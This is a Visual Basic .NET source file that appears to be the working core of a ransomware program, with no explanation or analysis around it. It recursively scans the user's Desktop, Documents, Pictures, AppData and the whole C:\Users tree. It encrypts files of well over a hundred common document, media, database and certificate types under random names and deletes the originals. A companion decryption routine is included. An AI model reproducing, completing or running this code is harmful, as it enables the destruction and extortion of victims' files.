Imports System.Collections.Generic
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Namespace ABCDEFGHJIKLMNOPQRSTUVWXYZ
    Public Class CryptFile

        Public Shared Function getRandomFileName() As String
            Dim retn As String = ""
            Dim pair As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()"
            Dim rnd As New Random()
            Dim i As Integer = rnd.[Next](7, 13)
            While System.Math.Max(System.Threading.Interlocked.Decrement(i), i + 1) > 0
                retn += pair(rnd.[Next](pair.Length))
            End While
            Return retn
        End Function
        Public Shared Function RandomPassword() As String
            Dim retn As String = ""
            Dim pair As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()"
            Dim rnd As New Random()
            Dim i As Integer = rnd.[Next](7, 13)
            While System.Math.Max(System.Threading.Interlocked.Decrement(i), i + 1) > 0
                retn += pair(rnd.[Next](pair.Length))
            End While
            Return retn
        End Function
        Public Shared Function encryptFile(ByVal orgFile As String, ByVal aesKey As Byte()) As Boolean
            Try
                Dim extNameList = ".rdp .png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw " & ".as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp " & ".cr2 .crt .crw .cs .csv .db .dbf .dcr .der .dng .doc .docb .docm " & ".docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv " & ".idml .iff .indb .indd .indl .indt .inx .jar .java .jpeg .jpg " & ".kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 " & ".mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt " & ".orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot " & ".potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel " & ".prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf " & ".rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif " & ".vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .ARIZ0NA" & ".xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip .class" & ".html .setup .dll .txt .ini .exe .jar"
                Dim fileDir As String = New FileInfo(orgFile).DirectoryName & "\"
                Dim fileFullName As String = New FileInfo(orgFile).Name
                Dim extName As String = New FileInfo(orgFile).Extension.ToLower()
                If Not extNameList.Contains(extName) OrElse extName = "" Then
                    Return False
                End If

                Dim fileData As [Byte]() = File.ReadAllBytes(orgFile)
                Dim fullNameArray As [Byte]() = Encoding.UTF8.GetBytes(fileFullName)
                If fullNameArray.Length > 128 Then
                    Return False
                End If

                Array.Resize(fileData, fileData.Length + 128)
                Array.ConstrainedCopy(fullNameArray, 0, fileData, fileData.Length - 128, fullNameArray.Length)
                File.WriteAllBytes(fileDir & getRandomFileName() & ".udaadhuidhd78932739082370djhlds", AES.encrypt(fileData, aesKey))
                File.Delete(orgFile)
                System.Threading.Thread.Sleep(500)
                Return True
            Catch generatedExceptionName As Exception
            End Try
            Return False
        End Function
        Public Shared Function decryptFile(ByVal orgFile As String, ByVal aesKey As [Byte]()) As Boolean

            Try
                Dim fileDir As String = New FileInfo(orgFile).DirectoryName & "\"
                Dim extName As String = New FileInfo(orgFile).Extension
                Dim fileName As String = New FileInfo(orgFile).Name.Split("."c)(0)
                If extName <> ".udaadhuidhd78932739082370djhlds" Then
                    Return False
                End If

                Dim fileData As [Byte]() = File.ReadAllBytes(orgFile)
                fileData = AES.decrypt(fileData, aesKey)
                Dim fileOrgExtName As [Byte]() = New Byte(128) {}
                Array.ConstrainedCopy(fileData, fileData.Length - 256, fileOrgExtName, 0, 128)
                Dim fullName As String = Encoding.UTF8.GetString(fileOrgExtName)
                fullName = fullName.TrimEnd(ControlChars.NullChar)
                Array.Resize(fileData, fileData.Length - 128)

                File.WriteAllBytes(fileDir & fullName, fileData)
                File.Delete(orgFile)

                Return True
            Catch generatedExceptionName As Exception
            End Try
            Return False
        End Function
    End Class

    Public Class AES
        Public Shared Function generateKey() As [Byte]()
            Dim AESObject = New RijndaelManaged()
            AESObject.KeySize = 128






            AESObject.GenerateKey()
            Return AESObject.Key
        End Function
        Public Shared Function encrypt(ByVal data As [Byte](), ByVal key As [Byte]()) As [Byte]()
            Dim provider_AES As New RijndaelManaged()
            provider_AES.KeySize = 128
            Dim encrypt_AES As ICryptoTransform = provider_AES.CreateEncryptor(key, key)
            Dim output As Byte() = encrypt_AES.TransformFinalBlock(data, 0, data.Length)
            Return output
        End Function

        Public Shared Function decrypt(ByVal byte_ciphertext As Byte(), ByVal key As [Byte]()) As [Byte]()
            Dim provider_AES As New RijndaelManaged()
            provider_AES.KeySize = 128
            Dim decrypt_AES As ICryptoTransform = provider_AES.CreateDecryptor(key, key)
            Dim byte_secretContent As Byte() = decrypt_AES.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length)
            Return byte_secretContent
        End Function
        Dim userDir = "C:\Users\"
        Public Sub crypt()

            System.Threading.Thread.CurrentThread.Priority = System.Threading.ThreadPriority.Highest
            Dim myKey As [Byte]() = ABCDEFGHJIKLMNOPQRSTUVWXYZ.AES.generateKey()
            Dim RSAObj As New RSACryptoServiceProvider()
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Templates), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Cookies), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.History), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), myKey)
            encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyComputer), myKey)
            encryptAll(userDir, myKey)
        End Sub
        Private Shared Sub encryptAll(ByVal dir As String, ByVal aesKey As [Byte]())
            Dim di = New DirectoryInfo(dir)
            Try
                For Each fi As FileInfo In di.GetFiles("*.*")
                    ABCDEFGHJIKLMNOPQRSTUVWXYZ.CryptFile.encryptFile(fi.FullName, aesKey)
                Next
                For Each d As DirectoryInfo In di.GetDirectories()
                    encryptAll(d.FullName, aesKey)
                Next
            Catch generatedExceptionName As Exception
            End Try
        End Sub
    End Class
End Namespace
